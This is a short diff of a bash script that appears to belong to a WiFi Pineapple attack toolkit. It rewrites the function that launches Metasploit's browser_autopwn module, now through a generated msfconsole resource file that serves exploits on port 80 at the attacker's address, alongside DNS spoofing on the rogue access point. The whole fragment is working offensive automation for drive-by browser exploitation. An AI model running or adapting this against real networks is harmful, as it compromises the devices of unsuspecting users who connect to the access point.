@@ -19,10 +19,16 @@ function start_browserpwn(){
   
   # Stop our apache server
   service apache2 stop > /dev/null 2>&1
-  echo -e "\n\e[01;34m[>]\e[00m Starting up metasploit browserpwn module.."
-  terminator -e "msfcli auxiliary/server/browser_autopwn LHOST=${our_ip} SRVPORT=80 URIPATH=/ E" > /dev/null 2>&1 &
+  echo -e "\e[01;34m[>]\e[00m Starting up metasploit browserpwn module.."
+  echo -e "use auxiliary/server/browser_autopwn
+  set LHOST \"${our_ip}\"
+  set URIPATH /
+  set SRVPORT 80
+  exploit -j" > /tmp/browserpwn.rc
+
+  terminator -e "msfconsole -r /tmp/browserpwn.rc" > /dev/null 2>&1 &
   
-  echo -e "\n\e[01;34m[>]\e[00m Sleeping while exploit modules load..."
+  echo -e "\e[01;34m[>]\e[00m Sleeping while exploit modules load..."
   sleep 2m
   
   # Set DNSspoof on the pineapple
